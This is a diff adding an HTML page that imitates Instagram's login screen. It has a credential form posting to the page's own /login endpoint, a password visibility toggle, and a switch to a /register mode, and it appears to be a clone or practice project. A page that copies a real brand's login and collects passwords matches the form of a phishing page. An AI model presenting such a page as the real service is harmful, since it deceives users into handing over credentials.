@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" />
+    </head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h1 class="logo">Instagram</h1>
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required />
+                <div class="input-group password-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required />
+                    <span class="password-toggle" id="passwordToggle" style="display: none;">Show</span>
+                </div>
+                <button type="submit">Log In</button>
+            </form>
+
+            <div class="or-text-only">OR</div>
+            <div class="or-line-below-fb"></div>
+
+            <button class="fb-login">Log in with Facebook</button>
+            <a href="#" class="forgot">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        const passwordField = document.getElementById('password');
+        const passwordToggleButton = document.getElementById('passwordToggle');
+
+        function togglePasswordVisibility() {
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                passwordToggleButton.textContent = 'Hide';
+            } else {
+                passwordField.type = 'password';
+                passwordToggleButton.textContent = 'Show';
+            }
+        }
+
+        passwordField.addEventListener('input', function() {
+            if (passwordField.value.length > 0) {
+                passwordToggleButton.style.display = 'block';
+            } else {
+                passwordToggleButton.style.display = 'none';
+                passwordField.type = 'password';
+                passwordToggleButton.textContent = 'Show';
+            }
+        });
+
+        passwordToggleButton.addEventListener('click', togglePasswordVisibility);
+
+        // --- Frontend form handling for registration/login response ---
+        const loginForm = document.querySelector('form');
+
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const form = event.target;
+            const formData = new URLSearchParams(new FormData(form));
+
+            fetch(form.action, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert(data);
+                if (form.action.includes('/register') && data.includes('successful')) {
+                    form.action = '/login';
+                    form.querySelector('button[type="submit"]').textContent = 'Log In';
+                    form.querySelector('button[type="submit"]').style.backgroundColor = '#0095f6';
+                    alert('You can now use your new account to log in.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred during submission.');
+            });
+        });
+
+        const signupLink = document.querySelector('.signup-link');
+        if (signupLink) {
+            signupLink.addEventListener('click', function(event) {
+                event.preventDefault();
+                loginForm.action = '/register';
+                loginForm.querySelector('button[type="submit"]').textContent = 'Sign Up';
+                loginForm.querySelector('button[type="submit"]').style.backgroundColor = '#28a745';
+                const usernameInput = loginForm.querySelector('input[name="username"]');
+                if (usernameInput) {
+                    usernameInput.placeholder = 'Email, phone, or username';
+                }
+                alert('Form is now in Registration mode. Enter details and click Sign Up.');
+            });
+        }
+    </script>
+</body>
+</html>
